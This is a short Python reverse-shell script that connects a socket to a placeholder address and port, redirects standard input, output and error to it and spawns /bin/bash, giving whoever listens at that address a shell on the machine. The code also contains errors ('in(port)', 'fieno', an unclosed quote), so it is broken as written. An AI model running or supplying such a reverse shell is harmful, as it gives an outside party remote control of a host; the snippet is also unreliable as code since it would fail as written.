import sys,socket,os,pty

ip="x.x.x.x"
port="12345"
s=socket.socket()
s.connect((ip,in(port)))
[os.dup2(s.fieno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash)
